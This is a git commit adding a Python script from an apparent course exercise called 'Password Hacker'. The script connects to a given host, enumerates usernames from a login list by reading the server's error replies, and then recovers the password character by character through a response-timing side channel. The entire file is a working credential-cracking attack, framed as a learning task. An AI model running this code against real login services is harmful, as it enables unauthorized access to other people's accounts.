7393528d45f1e01d537b4ebb11b10ad4380cc246
Konstantin <orzhekhovsky@gmail.com>
2022-06-22 00:58:52 +0300

    Create stage5_task.py

---
+++ Password Hacker/stage5_task.py
@@ -0,0 +1,60 @@
+import socket
+import sys
+import json
+import string
+from datetime import datetime
+
+
+args = sys.argv
+hostname = args[1]
+port = int(args[2])
+filename = 'logins.txt'
+credentials = {}
+status = 'pass'
+admin_pass = ''
+letters = string.ascii_letters + string.digits
+l_ix = 0
+
+def login_find():
+    with open(filename, 'r') as logins:
+        for login in logins:
+            yield login.strip("\n")
+
+
+def response_handling(server_response):
+    server_response = server_response.decode("utf-8")
+    server_response = json.loads(server_response)
+    response_details = server_response['result']
+    return response_details
+
+
+next_login = login_find()
+client_socket = socket.socket()
+address = (hostname, port)
+client_socket.connect(address)
+while status != "Wrong password!":
+    credentials['login'] = next(next_login)
+    credentials['password'] = ''
+    json_credentials = json.dumps(credentials)
+    message = json_credentials
+    message = message.encode("utf-8")
+    client_socket.send(message)
+    response = client_socket.recv(1024)
+    status = response_handling(response)
+while status != 'Connection success!':
+    credentials['password'] = admin_pass + letters[l_ix]
+    json_credentials = json.dumps(credentials)
+    start = datetime.now()
+    message = json_credentials
+    message = message.encode("utf-8")
+    client_socket.send(message)
+    response = client_socket.recv(1024)
+    finish = datetime.now()
+    difference = finish - start
+    status = response_handling(response)
+    if difference.microseconds >= 100000:
+        admin_pass = credentials['password']
+        l_ix = 0
+    l_ix += 1
+print(json_credentials)
+client_socket.close()
